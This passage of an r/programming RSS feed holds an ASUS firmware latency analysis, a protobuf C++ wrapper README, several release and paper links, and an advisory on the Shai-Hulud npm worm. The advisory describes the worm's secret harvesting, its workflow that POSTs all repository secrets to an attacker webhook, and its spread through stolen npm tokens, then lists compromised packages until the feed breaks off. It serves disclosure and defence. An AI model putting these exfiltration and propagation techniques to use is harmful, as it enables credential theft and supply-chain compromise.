display has been turned on"</span> <span>If</span> ((<span>Arg2</span> == <span>0x06</span>)) { <span>// Wake everything back up</span> <span>If</span> (<span>CondRefOf</span> (\<span>_SB</span>.PC00.PEG1.DGCE)) { ^^PC00.PEG1.DGCE = <span>Zero</span> <span>// Clear "GPU Cut Enable"</span> } <span>If</span> (S0ID == <span>One</span>) { GUAM (<span>Zero</span>) <span>// Exit low power mode</span> } ^^PC00.DPOF = <span>Zero</span> <span>// Display power on flag</span> <span>If</span> (<span>CondRefOf</span> (\<span>_SB</span>.PC00.XHCI.PSLI)) { ^^PC00.XHCI.PSLI (<span>0x06</span>) } } } }</pre></div><p>Once again, the firmware prepares to cut power to the discrete GPU without first checking if it's the only GPU driving the displays. This demonstrates that the Mux Mode Confusion is a systemic design flaw. The firmware is internally inconsistent, leading it to issue self-destructive commands that try to cripple the system.</p><h2>Cross-System Analysis</h2><a href="https://github.com#cross-system-analysis"></a><p>Traces from multiple ASUS gaming laptop models confirm this is not an isolated issue.</p><h4>Scar 15 Analysis</h4><a href="https://github.com#scar-15-analysis"></a> <ul> <li><strong>Trace Duration:</strong> 4.1 minutes</li> <li><strong><code>_GPE._L02</code> Events:</strong> 7 (every ~39 seconds)</li> <li><strong>Avg. GPE Duration:</strong> 1.56ms</li> <li><strong>GPU Power Cycles:</strong> 8</li> </ul><p></p><h4>Zephyrus M16 Analysis</h4><a href="https://github.com#zephyrus-m16-analysis"></a> <ul> <li><strong>Trace Duration:</strong> 19.9 minutes</li> <li><strong><code>_GPE._L02</code> Events:</strong> 3 (same periodic pattern)</li> <li><strong>Avg. GPE Duration:</strong> 2.94ms</li> <li><strong>GPU Power Cycles:</strong> 197 (far more frequent)</li> <li><strong>ASUS WMI Calls:</strong> 2,370 (Armoury Crate amplifying the problem)</li> </ul> <h3>What Actually Breaks</h3><a href="https://github.com#what-actually-breaks"></a><p>The firmware acts as the hardware abstraction layer between Windows and the physical hardware. When ACPI control methods execute, they run under the Windows ACPI driver with specific timing constraints and because of these timing constraints GPE control methods need to finish quickly because the firing GPE stays masked until the method returns so sleeping or polling inside a path like that can trigger real time-glitches and produce very high latency numbers, as our tests indicate.</p><p>Microsoft's <a href="https://learn.microsoft.com/windows-hardware/test/hlk/testref/f0ed5aa8-ef49-4fc9-99b6-753c857e4e2d">Hardware Lab Kit GlitchFree test</a> validates this hardware-software contract by measuring audio/video glitches during HD playback. It fails systems with driver stalls exceeding a few milliseconds because such delays break real-time guarantees needed for smooth media playback.</p><p>These ASUS systems violate those constraints. The firmware holds GPE._L02 masked for 13ms while sleeping in ECLV, serializing all ACPI/EC operations behind that delay. It polls battery state when it should use event-driven notifications. It attempts GPU power transitions without checking platform configuration (HGMD). All these problems result in powerful hardware crippled by firmware that doesn't understand its own execution context.</p><h3>The Universal Pattern</h3><a href="https://github.com#the-universal-pattern"></a><p>Despite being different models, all affected systems exhibit the same core flaws:</p><ol> <li><code>_GPE._L02</code> handlers take milliseconds to execute instead of microseconds.</li> <li>The GPEs trigger unnecessary battery polling.</li> <li>The firmware attempts to power cycle the GPU while in a fixed MUX mode.</li> <li>The entire process is driven by a periodic, timer-like trigger.</li> </ol> <h2>Summarizing the Findings</h2><a href="https://github.com#summarizing-the-findings"></a><p>This bug is a cascade of firmware design failures.</p><h3>Root Cause 1: The Misunderstanding of Interrupt Context</h3><a href="https://github.com#root-cause-1-the-misunderstanding-of-interrupt-context"></a><p>On windows, the LXX / EXX run at PASSIVE_LEVEL via ACPI.sys but while a GPE control method runs <strong>the firing GPE stays masked</strong> and ACPI/EC work is <strong>serialized</strong>. ASUS's dispatch from GPE._L02 to ECLV loops, calls Sleep(25/100ms) and re-arms the EC stretching that masked window into tens of milliseconds (which would explain the 13ms CPU time in ETW (Kernel ms) delay for GPE Events) and producing a periodic ACPI.sys burst that causes the latency problems on the system. The correct behavior is to latch or clear the event, exit the method, and signal a driver with Notify for any heavy work; do not self-rearm or sleep in this path at all.</p><h3>Root Cause 2: Flawed Interrupt Handling</h3><a href="https://github.com#root-cause-2-flawed-interrupt-handling"></a><p>The firmware artificially re-arms the interrupt, creating an endless loop of GPEs instead of clearing the source and waiting for the next legitimate hardware event. This transforms a hardware notification system into a disruptive, periodic timer.</p><h3>Root Cause 3: Lack of Platform Awareness</h3><a href="https://github.com#root-cause-3-lack-of-platform-awareness"></a><p>The code that sends GPU power notifications does not check if the system is in MUX mode, a critical state check that is correctly performed in other parts of the firmware. This demonstrates inconsistency and a lack of quality control.</p><h2>Timeline of User Reports</h2><a href="https://github.com#timeline-of-user-reports"></a><p></p><h3>The Three-Year Pattern</h3><a href="https://github.com#the-three-year-pattern"></a><p>This issue is not new or isolated. User reports documenting identical symptoms with high ACPI.sys DPC latency, periodic stuttering, and audio crackling have been accumulating since at least 2021 across ASUS's entire gaming laptop lineup.</p><p><strong>August 2021: First major reports (AMD Advantage Edition)</strong> The earliest documented case on the official ASUS ROG forums is a <strong>G15 Advantage Edition (G513QY, all-AMD)</strong> owner reporting <a href="https://rog-forum.asus.com/t5/rog-strix-series/g15-advantage-edition-g513qy-severe-dpc-latency-audio-dropouts/m-p/809512">"severe DPC latency from ACPI.sys"</a> with audio dropouts under any load. The thread, last edited in March 2024, shows the issue remained unresolved for years.</p><p><strong>August 2021: Parallel reports (NVIDIA-based models)</strong> Around the same time, <strong>separate Reddit threads on NVIDIA-based ROG models</strong> describe <a href="https://www.reddit.com/r/ASUS/comments/odprtv/high_dpc_latency_from_acpisys_can_be_caused_by/">identical ACPI.sys latency problems</a>. Different GPU vendors, same firmware/ACPI failure pattern.</p><p><strong>2021-2023: Spreading Across Models</strong><br> Throughout this period, the issue proliferates across ASUS's gaming lineup:</p><ul> <li><a href="https://www.reddit.com/r/techsupport/comments/mxtm86/i_need_help_high_acpisys_latency_and_microstutters/">ROG Strix models experience micro-stutters</a></li> <li><a href="https://www.reddit.com/r/Asustuf/comments/1m2e40v/my_laptop_throttling_for_few_seconds/">TUF Gaming series reports throttling for seconds at a time</a></li> <li><a href="https://www.reddit.com/r/techsupport/comments/17rqfq5/new_laptop_started_stuttering_every_45_seconds/">G18 models exhibit the characteristic 45-second periodic stuttering</a></li> </ul><p><strong>2023-2024: The Problem Persists in New Models</strong><br> Even the latest generations aren't immune:</p><ul> <li><a href="https://www.reddit.com/r/ZephyrusM16/comments/1j33ld6/this_machine_has_been_nothing_but_problems_no/">2023 Zephyrus G16 owners report persistent audio issues</a></li> <li><a href="https://www.reddit.com/r/ZephyrusG14/comments/1l4jb13/audio_popscrackles_on_zephyrus_g16_2023/">2023 G16 models continue experiencing audio pops/crackles</a></li> <li><a href="https://www.reddit.com/r/ZephyrusG14/comments/1i2w9ah/resolving_audio_popsstuttering_on_2024_intel_g16/">2024 Intel G16 models require workarounds for audio stuttering</a></li> </ul> <h2>Conclusion</h2><a href="https://github.com#conclusion"></a><p>The evidence is undeniable:</p><ul> <li><strong>Measured Proof:</strong> GPE handlers are measured blocking a CPU core for over 13 milliseconds.</li> <li><strong>Code Proof:</strong> The decompiled firmware explicitly contains <code>Sleep()</code> calls within an interrupt handler.</li> <li><strong>Logical Proof:</strong> The code lacks critical checks for the laptop's hardware state (MUX mode).</li> <li><strong>Systemic Proof:</strong> The issue is reproducible across different models and BIOS versions.</li> </ul><p>Until a fix is implemented, millions of buyers of Asus laptops from approx. 2021 to present day are facing stutters on the simplest of tasks, such as watching YouTube, for the simple mistake of using a sleep call inside of an inefficient interrupt handler and not checking the GPU environment properly.</p><p>The code is there. The traces prove it. ASUS must fix its firmware.</p><blockquote><p>ASUS has officially put out a statement: <a href="https://x.com/asus_rogna/status/1968404596658983013?s=46">https://x.com/asus_rogna/status/1968404596658983013?s=46</a></p></blockquote> <hr><p><em>Investigation conducted using the Windows Performance Toolkit, ACPI table extraction tools, and Intel ACPI Component Architecture utilities. All code excerpts are from official ASUS firmware. Traces were captured on multiple affected systems, all showing consistent behavior. I used an LLM for wording. The research, traces, and AML decomp are mine. Every claim is verified and reproducible if you follow the steps in the article; logs and commands are in the repo. If you think something's wrong, cite the exact timestamp/method/line. "AI wrote it" is not an argument.</em></p></article></div></section>]]></description><pubDate>Wed, 17 Sep 2025 05:38:51 +0530</pubDate></item><item><link>https://github.com/illegal-instruction-co/sugar-proto</link><title>A new experiment: making Protobuf in C++ less painful (inspired by the old "why is Protobuf so clunky?" thread) (github.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1niuy6j/a_new_experiment_making_protobuf_in_c_less/</guid><comments>https://www.reddit.com/r/programming/comments/1niuy6j/a_new_experiment_making_protobuf_in_c_less/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 7 min | <a href='https://www.reddit.com/r/programming/comments/1niuy6j/a_new_experiment_making_protobuf_in_c_less/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>Hey folks,</p><p>Some hours back there was a lively discussion here: <a href="https://www.reddit.com/r/programming/comments/1nibv4y/why_is_protobufs_c_api_so_clunky_would_a/">Why is Protobuf’s C API so clunky?</a></p><p>I was in that thread too, tossing around ideas like <em>“what if we could do</em> <code>user[&quot;id&quot;] = 123;</code> <em>and have it fail at compile time if you tried</em> <code>user[&quot;id&quot;] = &quot;oops&quot;;</code><em>”</em>. The feedback I got there was super helpful — a few people pointed out I was basically forcing JSON-style dynamics into a static Protobuf world, which doesn’t really fit. That clicked with me.</p><p>Since then I hacked on a small library/plugin called <strong>Sugar-Proto</strong>. It’s a protoc plugin that generates wrappers around your <code>.proto</code> messages, giving you something closer to a <code>nlohmann/json</code> feel, but still 100% type-safe and zero runtime reflection.</p><p>Example:</p><pre><code>User user;UserWrapped u(user);u.name = &quot;Alice&quot;;u.id = 42;u.posts.push_back({{&quot;title&quot;, &quot;Hello&quot;}, {&quot;comments&quot;, {{&quot;text&quot;, &quot;Nice!&quot;}}}});</code></pre><p>Under the hood it’s just normal protobuf fields, no hidden runtime map lookups. The idea is: <strong>make the API less clunky without pretending it’s JSON.</strong></p><p>It’s early, not production-ready yet, but I’d love for people to kick the tires and tell me what feels right/wrong.</p><p>Curious to hear if anyone else tried wrapping protobuf in a more ergonomic C++ way. Do you think this direction has legs, or is protobuf doomed to always feel a bit Java-ish in C++?</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://opengraph.githubassets.com/b019159b01824c30e510dbbdfa2eb3754ee013ff0797647663d90d40b242e9e6/illegal-instruction-co/sugar-proto' /></section><section class='parsed-content'><div><article><h2>sugar-proto</h2><a href="https://github.com#sugar-proto"></a><p><code>sugar-proto</code> is a lightweight wrapper and plugin for Protocol Buffers. The main goal is to make working with protobuf in C++ feel simpler and more intuitive, closer to plain struct and stl like APIs.</p><h2>Why</h2><a href="https://github.com#why"></a><p>Using the default protobuf C++ API can feel verbose and rigid. With sugar-proto, you can interact with your messages in a much friendlier way, for example:</p><div><pre>u.id = <span>123</span>; u.tags.push_back(<span><span>"</span>cpp<span>"</span></span>); u.profile.city = <span><span>"</span>Berlin<span>"</span></span>; cout &lt;&lt; u.id &lt;&lt; endl; cout &lt;&lt; u.tags[] &lt;&lt; endl; cout &lt;&lt; u.profile.city &lt;&lt; endl;</pre></div><p>Instead of juggling with reflection and getters/setters everywhere, you get a concise and readable interface.</p><h2>Installation</h2><a href="https://github.com#installation"></a><p>Build and install with:</p><div><pre>git clone https://github.com/illegal-instruction-co/sugar-proto.git <span>cd</span> sugar-proto mkdir build <span>&amp;&amp;</span> <span>cd</span> build cmake .. make -j sudo make install</pre></div><p>After installation:</p><ul> <li>The plugin binary will be placed at <code>/usr/local/bin/protoc-gen-sugar</code></li> <li>The runtime header will be installed at <code>/usr/local/include/sugar/sugar_runtime.h</code></li> <li>CMake config files will be available so you can simply use <code>find_package(sugar-proto REQUIRED)</code> in your own projects</li> </ul> <h2>Usage</h2><a href="https://github.com#usage"></a><p>In your project&rsquo;s <code>CMakeLists.txt</code>:</p><div><pre><span>find_package</span>(<span>Protobuf</span> <span>REQUIRED</span>) <span>find_package</span>(<span>sugar-proto</span> <span>REQUIRED</span>) <span>set</span>(<span>PROTO_FILE</span> <span>${CMAKE_SOURCE_DIR}</span><span>/my.proto</span>) <span>set</span>(<span>GENERATED_DIR</span> <span>${CMAKE_BINARY_DIR}</span><span>/generated</span>) <span>file</span>(<span>MAKE_DIRECTORY</span> <span>${GENERATED_DIR}</span>) <span>add_custom_command</span>( <span>OUTPUT</span> <span>${GENERATED_DIR}</span><span>/my.pb.cc</span> <span>${GENERATED_DIR}</span><span>/my.pb.h</span> <span>COMMAND</span> <span>${Protobuf_PROTOC_EXECUTABLE}</span> <span>--cpp_out=${GENERATED_DIR}</span> <span>-I</span> <span>${CMAKE_SOURCE_DIR}</span> <span>${PROTO_FILE}</span> <span>DEPENDS</span> <span>${PROTO_FILE}</span> ) <span>add_custom_command</span>( <span>OUTPUT</span> <span>${GENERATED_DIR}</span><span>/my.sugar.h</span> <span>COMMAND</span> <span>${Protobuf_PROTOC_EXECUTABLE}</span> <span>--sugar_out=${GENERATED_DIR}</span> <span>-I</span> <span>${CMAKE_SOURCE_DIR}</span> <span>${PROTO_FILE}</span> <span>DEPENDS</span> <span>${PROTO_FILE}</span> ) <span>add_executable</span>(<span>my_app</span> <span>main.cpp</span> <span>${GENERATED_DIR}</span><span>/my.pb.cc</span> ) <span>target_include_directories</span>(<span>my_app</span> <span>PRIVATE</span> <span>${GENERATED_DIR}</span>) <span>target_link_libraries</span>(<span>my_app</span> <span>PRIVATE</span> <span>Protobuf::libprotobuf</span>)</pre></div><h2>Example Code</h2><a href="https://github.com#example-code"></a><div>int main() { MyMessage msg; MyMessageWrapped u(msg); u.id = 42; u.name = "hello world"; u.tags.push_back("first"); u.tags.push_back("test"); std::cout &lt;&lt; msg.DebugString() &lt;&lt; std::endl; std::cout &lt;&lt; u.id &lt;&lt; std::endl; std::cout &lt;&lt; u.name &lt;&lt; std::endl; return 0; }"&gt;<pre>#<span>include</span> <span><span>"</span>my.pb.h<span>"</span></span> #<span>include</span> <span><span>"</span>my.sugar.h<span>"</span></span> #<span>include</span> <span><span>&lt;</span>iostream<span>&gt;</span></span> <span>int</span> <span>main</span>() { MyMessage msg; MyMessageWrapped <span>u</span>(msg); u.<span>id</span> = <span>42</span>; u.<span>name</span> = <span><span>"</span>hello world<span>"</span></span>; u.<span>tags</span>.<span>push_back</span>(<span><span>"</span>first<span>"</span></span>); u.<span>tags</span>.<span>push_back</span>(<span><span>"</span>test<span>"</span></span>); std::cout &lt;&lt; msg.<span>DebugString</span>() &lt;&lt; std::endl; std::cout &lt;&lt; u.<span>id</span> &lt;&lt; std::endl; std::cout &lt;&lt; u.<span>name</span> &lt;&lt; std::endl; <span>return</span> ; }</pre></div><p></p><h2>Notes</h2><a href="https://github.com#notes"></a> <ul> <li>Minimum required CMake version is 3.16 (recommended 3.21 or newer)</li> <li>Currently supports: scalar fields, repeated fields, maps, and oneofs</li> <li>API is not considered stable yet, small breaking changes may occur</li> </ul><p>If you run into issues or missing features, please open an issue. The ultimate goal is to make protobuf usage in C++ enjoyable and developer friendly.</p></article></div></section>]]></description><pubDate>Wed, 17 Sep 2025 03:21:04 +0530</pubDate></item><item><link>https://www.swift.org/blog/swift-6.2-released/</link><title>Swift 6.2 Released (swift.org)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nirl8a/swift_62_released/</guid><comments>https://www.reddit.com/r/programming/comments/1nirl8a/swift_62_released/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p><a href='https://www.reddit.com/r/programming/comments/1nirl8a/swift_62_released/'>Post permalink</a></p></section>]]></description><pubDate>Wed, 17 Sep 2025 01:12:42 +0530</pubDate></item><item><link>https://medium.com/techtofreedom/google-ends-support-for-pytype-this-is-how-python-developers-can-adapt-a703d964028a?sk=e228cb9233d3e5fa91d3757c1946ad24</link><title>Google Ends Support for Pytype: This is How Python Developers Can Adapt (medium.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1niqo5q/google_ends_support_for_pytype_this_is_how_python/</guid><comments>https://www.reddit.com/r/programming/comments/1niqo5q/google_ends_support_for_pytype_this_is_how_python/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1niqo5q/google_ends_support_for_pytype_this_is_how_python/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><h2>Google Ends Support for Pytype: This is How Python Developers Can Adapt</h2><div><h2>And what it says about the evolution of Python typing.</h2></div><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption>Image from <a href="https://wallhaven.cc/w/m992d8">Wallhaven</a></figcaption></figure><p>After years of maintaining Pytype, Google has <a href="https://github.com/google/pytype/blob/main/README.md">officially announced</a> that it is sunsetting the project, and the last supported Python version is 3.12.</p><p>As an ambitious type-checking tool for Python, Pytype was popular, especially when Python&rsquo;s type hints syntax wasn&rsquo;t comprehensive enough.</p><p>While the news might not come as a surprise given the rapid evolution of Python typing tools, it does raise important questions about the ecosystem and the direction of type checking in Python. As Python developers, we should adapt to the rapid changes to enhance our skills.</p><p>This article will help you understand what this move means and how it will affect you.</p><h2>What Was Pytype?</h2><p>Pytype was Google&rsquo;s in-house tool developed since 2012. As a handy type analysis tool, Pytype could:</p><ul><li>Infer types without explicit type hints.</li><li>Detect type errors across large codebases.</li><li>Generate type stubs for libraries lacking type information.</li><li>Provide flexible integration for teams with legacy Python code.</li></ul></div><div class="gallery"><p><img src="https://miro.medium.com/v2/resize:fill:64:64/2*LGEGZoQWcwrCYPOxGsacCg.jpeg"></p></div></section>]]></description><pubDate>Wed, 17 Sep 2025 00:38:51 +0530</pubDate></item><item><link>https://mail.openjdk.org/pipermail/announce/2025-September/000360.html</link><title>Java 25 / JDK 25: General Availability (mail.openjdk.org)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nil3zi/java_25_jdk_25_general_availability/</guid><comments>https://www.reddit.com/r/programming/comments/1nil3zi/java_25_jdk_25_general_availability/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p><a href='https://www.reddit.com/r/programming/comments/1nil3zi/java_25_jdk_25_general_availability/'>Post permalink</a></p></section>]]></description><pubDate>Tue, 16 Sep 2025 21:15:12 +0530</pubDate></item><item><link>https://papers.ssrn.com/sol3/papers.cfm?abstract_id=5425555</link><title>Generative AI is hollowing out entry-level jobs, study finds (papers.ssrn.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nika5f/generative_ai_is_hollowing_out_entrylevel_jobs/</guid><comments>https://www.reddit.com/r/programming/comments/1nika5f/generative_ai_is_hollowing_out_entrylevel_jobs/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1nika5f/generative_ai_is_hollowing_out_entrylevel_jobs/'>Post permalink</a></p></section><section class='preview-image'><img src='https://cdn.ssrn.com/ssrn-global-header/11589acb53bc518aa22929bf19add113.svg' /></section><section class='parsed-content'><div><p><span>35 Pages</span> <span>Posted: 8 Sep 2025</span> </p><p>Date Written: August 31, 2025</p><div><h3>Abstract</h3><p>We study whether generative artificial intelligence (AI) constitutes a form of <i>seniority-biased technological change</i>, disproportionately affecting junior relative to senior workers. Using U.S. r&eacute;sum&eacute; and job posting data covering nearly 62 million workers in 285,000 firms (2015-2025), we track within-firm employment dynamics by seniority. We identify AI adoption through a text-analysis approach that flags postings for dedicated "AI integrator" roles, signaling active implementation of generative AI. Difference-in-differences and triple-difference estimates show that, beginning in 2023Q1, junior employment in adopting firms declined sharply relative to non-adopters, while senior employment continued to rise. The junior decline is driven primarily by slower hiring rather than increased separations, with the largest effects in wholesale and retail trade. Heterogeneity by education reveals a U-shaped pattern: mid-tier graduates see the largest declines, while elite and low-tier graduates are less affected. Overall, the results provide early evidence of a seniority-biased impact of AI adoption and its mechanisms. </p></div><center> </center><p><strong>Keywords:</strong> Generative AI, Technological Change, Generative Artificial Intelligence, Labor Market, AI Adoption, Job Postings, R&eacute;sum&eacute; Data, Career Ladders, Entry-Level Employment, United States labor market</p><p><strong>JEL Classification:</strong> J24, J31, J63, O33, L23</p><p><strong>Suggested Citation:</strong> <a href="https://papers.ssrn.com#">Suggested Citation<i></i></a> </p><p>Lichtinger, Guy and Hosseini Maasoum, Seyed Mahdi and Hosseini Maasoum, Seyed Mahdi, Generative AI as Seniority-Biased Technological Change: Evidence from U.S. R&eacute;sum&eacute; and Job Posting Data (August 31, 2025). Available at SSRN: <a href="https://ssrn.com/abstract=5425555">https://ssrn.com/abstract=5425555</a> or <a href="https://dx.doi.org/10.2139/ssrn.5425555">http://dx.doi.org/10.2139/ssrn.5425555 </a> </p></div></section>]]></description><pubDate>Tue, 16 Sep 2025 20:44:33 +0530</pubDate></item><item><link>https://www.aikido.dev/blog/s1ngularity-nx-attackers-strike-again</link><title>Crowdstrike Packages Infected with Malware (and other 167 packages infected as well) (aikido.dev)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nihrpt/crowdstrike_packages_infected_with_malware_and/</guid><comments>https://www.reddit.com/r/programming/comments/1nihrpt/crowdstrike_packages_infected_with_malware_and/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 19 min | <a href='https://www.reddit.com/r/programming/comments/1nihrpt/crowdstrike_packages_infected_with_malware_and/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>sigh.... Kinda getting sick of writing these, absolutely insane the pace of supply chain attacks anyway...<br/>The same ThreatActors behind the NX S1ngularity attack have launched a self-replicating worm, it&#39;s infected 187 packages and its terrifying.</p><p>Yesterday a software developer  <a href="https://www.linkedin.com/in/daniel-pereira-b17a27160/">Daniel Pereira </a>noticed a weird repo being created.... when he looked into it he was the first to realize that actually <a href="https://www.npmjs.com/package/@ctrl/tinycolor">tinycolor </a>was infected with malware. He reached out to multiple people, no one took him seriously until he reached out to Socket who discovered that <a href="https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages">40 packages were compromised</a>.</p><p>Fun story, a little concerning but honestly this happens a lot so it&#39;s not crazy.... But then it got worse, so much worse.</p><p>When I woke up, our lead researcher Charlie Erikson had discovered that actually a total of 187 packages were compromised (147 more than Socket had reported) 20 of which were from Crowdstrike.</p><p>What does the worm do</p><ul><li><strong>Harvest</strong>: scans the host and CI environment for secrets — process.env, scanning with TruffleHog, and cloud metadata endpoints (AWS/GCP) that return instance/service credentials.</li><li><strong>Exfiltrate (1) — GitHub repo</strong>: creates a repo named <strong>Shai-Hulud</strong> under the compromised account and commits a JSON dump containing system info, environment variables, and collected secrets.</li><li><strong>Exfiltrate (2) — GitHub Actions → webhook</strong>: drops a workflow <code>.github/workflows/shai-hulud-workflow.yml</code> that serializes <code>${{ toJSON(secrets) }}</code>, POSTs them to an attacker <code>webhook[.]site</code> URL and writes a double-base64 copy into the Actions logs.</li><li><strong>Propagate</strong>: uses any valid npm tokens it finds to enumerate and attempt to update packages the compromised maintainer controls (supply-chain propagation).</li><li><strong>Amplify</strong>: iterates the victim’s accessible repositories, making them public or adding the workflow/branch that will trigger further runs and leaks.</li></ul><p>Its already turned <a href="https://github.com/search?q=Shai-Hulud+Migration&amp;ref=opensearch&amp;type=repositories&amp;s=updated&amp;o=asc">700 previously private repositories public</a>  This number will go down as they are removed by maintainers</p><p>if you remeber the S1ngularity breach this is the exact same type of attacker and 100% the same attackers.</p><p>The questions I have from that attack remain.... I have no idea why they are exfiltrating secrets to Public GitHub repos and not a private C2 servers (other than to cause chaos)</p><p>The malicious versions have since been removed by Crowdstrikes account. Here is a total list of the packages compromised and their versions</p><table><thead><tr><th>@ahmedhfarag/ngx-perfect-scrollbar</th><th>20.0.20</th></tr></thead><tbody><tr><td>@ahmedhfarag/ngx-virtual-scroller</td><td>4.0.4</td></tr><tr><td>@art-ws/common</td><td>2.0.28</td></tr><tr><td>@art-ws/config-eslint</td><td>2.0.4, 2.0.5</td></tr><tr><td>@art-ws/config-ts</td><td>2.0.7, 2.0.8</td></tr><tr><td>@art-ws/db-context</td><td>2.0.24</td></tr><tr><td>@art-ws/di</td><td>2.0.28, 2.0.32</td></tr><tr><td>@art-ws/di-node</td><td>2.0.13</td></tr><tr><td>@art-ws/eslint</td><td>1.0.5, 1.0.6</td></tr><tr><td>@art-ws/fastify-http-server</td><td>2.0.24, 2.0.27</td></tr><tr><td>@art-ws/http-server</td><td>2.0.21, 2.0.25</td></tr><tr><td>@art-ws/openapi</td><td>0.1.9, 0.1.12</td></tr><tr><td>@art-ws/package-base</td><td>1.0.5, 1.0.6</td></tr><tr><td>@art-ws/prettier</td><td>1.0.5, 1.0.6</td></tr><tr><td>@art-ws/slf</td><td>2.0.15, 2.0.22</td></tr><tr><td>@art-ws/ssl-info</td><td>1.0.9, 1.0.10</td></tr><tr><td>@art-ws/web-app</td><td>1.0.3, 1.0.4</td></tr><tr><td>@crowdstrike/commitlint</td><td>8.1.1, 8.1.2</td></tr><tr><td>@crowdstrike/falcon-shoelace</td><td>0.4.1, 0.4.2</td></tr><tr><td>@crowdstrike/foundry-js</td><td>0.19.1, 0.19.2</td></tr><tr><td>@crowdstrike/glide-core</td><td>0.34.2, 0.34.3</td></tr><tr><td>@crowdstrike/logscale-dashboard</td><td>1.205.1, 1.205.2</td></tr><tr><td>@crowdstrike/logscale-file-editor</td><td>1.205.1, 1.205.2</td></tr><tr><td>@crowdstrike/logscale-parser-edit</td><td>1.205.1, 1.205.2</td></tr><tr><td>@crowdstrike/logscale-search</td><td>1.205.1, 1.205.2</td></tr><tr><td>@crowdstrike/tailwind-toucan-base</td><td>5.0.1, 5.0.2</td></tr><tr><td>@ctrl/deluge</td><td>7.2.1, 7.2.2</td></tr><tr><td>@ctrl/golang-template</td><td>1.4.2, 1.4.3</td></tr><tr><td>@ctrl/magnet-link</td><td>4.0.3, 4.0.4</td></tr><tr><td>@ctrl/ngx-codemirror</td><td>7.0.1, 7.0.2</td></tr><tr><td>@ctrl/ngx-csv</td><td>6.0.1, 6.0.2</td></tr><tr><td>@ctrl/ngx-emoji-mart</td><td>9.2.1, 9.2.2</td></tr><tr><td>@ctrl/ngx-rightclick</td><td>4.0.1, 4.0.2</td></tr><tr><td>@ctrl/qbittorrent</td><td>9.7.1, 9.7.2</td></tr><tr><td>@ctrl/react-adsense</td><td>2.0.1, 2.0.2</td></tr><tr><td>@ctrl/shared-torrent</td><td>6.3.1, 6.3.2</td></tr><tr><td>@ctrl/tinycolor</td><td>4.1.1, 4.1.2</td></tr><tr><td>@ctrl/torrent-file</td><td>4.1.1, 4.1.2</td></tr><tr><td>@ctrl/transmission</td><td>7.3.1</td></tr><tr><td>@ctrl/ts-base32</td><td>4.0.1, 4.0.2</td></tr><tr><td>@hestjs/core</td><td>0.2.1</td></tr><tr><td>@hestjs/cqrs</td><td>0.1.6</td></tr><tr><td>@hestjs/demo</td><td>0.1.2</td></tr><tr><td>@hestjs/eslint-config</td><td>0.1.2</td></tr><tr><td>@hestjs/logger</td><td>0.1.6</td></tr><tr><td>@hestjs/scalar</td><td>0.1.7</td></tr><tr><td>@hestjs/validation</td><td>0.1.6</td></tr><tr><td>@nativescript-community/arraybuffers</td><td>1.1.6, 1.1.7, 1.1.8</td></tr><tr><td>@nativescript-community/gesturehandler</td><td>2.0.35</td></tr><tr><td>@nativescript-community/perms</td><td>3.0.5, 3.0.6, 3.0.7, 3.0.8</td></tr><tr><td>@nativescript-community/sqlite</td><td>3.5.2, 3.5.3, 3.5.4, 3.5.5</td></tr><tr><td>@nativescript-community/text</td><td>1.6.9, 1.6.10, 1.6.11, 1.6.12</td></tr><tr><td>@nativescript-community/typeorm</td><td>0.2.30, 0.2.31, 0.2.32, 0.2.33</td></tr><tr><td>@nativescript-community/ui-collectionview</td><td>6.0.6</td></tr><tr><td>@nativescript-community/ui-document-picker</td><td>1.1.27, 1.1.28</td></tr><tr><td>@nativescript-community/ui-drawer</td><td>0.1.30</td></tr><tr><td>@nativescript-community/ui-image</td><td>4.5.6</td></tr><tr><td>@nativescript-community/ui-label</td><td>1.3.35, 1.3.36, 1.3.37</td></tr><tr><td>@nativescript-community/ui-material-bottom-navigation</td><td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td></tr><tr><td>@nativescript-community/ui-material-bottomsheet</td><td>7.2.72</td></tr><tr><td>@nativescript-community/ui-material-core</td><td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td></tr><tr><td>@nativescript-community/ui-material-core-tabs</td><td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td></tr><tr><td>@nativescript-community/ui-material-ripple</td><td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td></tr><tr><td>@nativescript-community/ui-material-tabs</td><td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td></tr><tr><td>@nativescript-community/ui-pager</td><td>14.1.36, 14.1.37, 14.1.38</td></tr><tr><td>@nativescript-community/ui-pulltorefresh</td><td>2.5.4, 2.5.5, 2.5.6, 2.5.7</td></tr><tr><td>@nexe/config-manager</td><td>0.1.1</td></tr><tr><td>@nexe/eslint-config</td><td>0.1.1</td></tr><tr><td>@nexe/logger</td><td>0.1.3</td></tr><tr><td>@nstudio/angular</td><td>20.0.4, 20.0.5, 20.0.6</td></tr><tr><td>@nstudio/focus</td><td>20.0.4, 20.0.5, 20.0.6</td></tr><tr><td>@nstudio/nativescript-checkbox</td><td>2.0.6, 2.0.7, 2.0.8, 